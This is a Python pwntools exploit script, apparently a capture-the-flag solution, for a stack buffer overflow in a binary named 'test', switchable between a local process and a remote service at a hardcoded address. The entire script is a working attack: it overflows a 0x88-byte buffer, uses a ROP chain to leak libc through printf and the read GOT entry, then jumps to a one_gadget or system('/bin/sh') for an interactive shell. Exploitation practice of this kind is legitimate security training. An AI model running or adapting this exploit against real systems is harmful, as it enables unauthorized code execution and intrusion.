#!/usr/bin/env python
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

local = 1
if local:
	p = process('./test')
	elf = ELF('./test')
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
	p = remote('183.129.189.60', 10012)
	elf = ELF('./test')
	libc = ELF('./libc.so.6')

def csu(func, rdi, rsi, rdx):
	payload = p64(0x40081a) + p64(0) + p64(1) + p64(func) + p64(rdi) + p64(rsi) + p64(rdx)
	payload += p64(0x400800) + '\x00' * 56
	return payload

start = 0x00000000004005C0
main = 0x0000000000400769
vul = 0x4006d2
buf_addr = 0x0000000000400875
read_plt = elf.plt['read']
read_got = elf.got['read']
printf_plt = elf.plt['printf']
pop_rdi_ret = 0x0000000000400823
pop_rsi_r15_ret = 0x0000000000400821
ret = 0x000000000040055e

#gdb.attach(p)
p.recvuntil('your name: ')
p.sendline(str(0x1000))
#payload = cyclic(0x300)
payload = ('A' * 0x88 + 
    p64(pop_rdi_ret) + p64(buf_addr) + 
    p64(pop_rsi_r15_ret) + p64(read_got) + p64(0) + 
    p64(printf_plt) + 
    p64(start)
)
p.recvuntil('you name? ')
p.sendline(payload)
libc_base = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00')) - libc.symbols['read']
info('libc_base = ' + hex(libc_base))
system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search('/bin/sh'))
one_gadgets = [0x4f2c5, 0x4f322, 0x10a38c]
one_gadget = libc_base + one_gadgets[0]

p.recvuntil('your name: ')
p.sendline(str(0x1000))
p.recvuntil('you name? ')
payload = 'A' * 0x88 + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(ret) + p64(system_addr)
payload = 'A' * 0x88 + p64(one_gadget)
#payload = cyclic(0x300)
p.sendline(payload)
p.interactive()

